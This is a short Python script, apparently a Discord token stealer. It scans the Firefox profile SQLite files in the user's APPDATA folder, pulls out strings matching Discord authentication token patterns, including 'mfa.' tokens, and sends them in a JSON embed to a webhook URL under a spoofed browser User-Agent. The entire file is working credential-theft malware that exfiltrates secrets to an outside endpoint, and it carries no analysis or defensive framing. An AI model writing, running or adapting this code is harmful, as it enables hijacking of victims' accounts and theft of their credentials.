import os, re, json, time
from urllib.request import Request, urlopen

webhook_url = ''
appdata = os.getenv('APPDATA')
path = rf'{appdata}\Mozilla\Firefox\Profiles'

tokens = []
checked = []
linecount = 0
t0 = time.time()
for path, subdirs, files in os.walk(path):
	for file in files:
		if not file.endswith('.sqlite'):
			continue
		file = os.path.join(path, file)
		for line in [x.strip() for x in open(f'{file}', errors='ignore').readlines() if x.strip()]:
			linecount = linecount + 1
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
					linecount = linecount + 1
t1 = time.time()
elapsed = t1-t0
elapsed = round(elapsed, 3)

linecount = str(linecount)

embed = [{'description' : '', 'footer': {'text': f'Scanned {linecount} lines • Completed in {elapsed} seconds'}}]
embed[0]['description'] += f'Grabbed from Firefox\n```'

for token in tokens:
	embed[0]['description'] += f'{token}\n'

embed[0]['description'] += f'```'

urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_4) AppleWebKit/5352 (KHTML, like Gecko) Chrome/40.0.820.0 Mobile Safari/5352'}))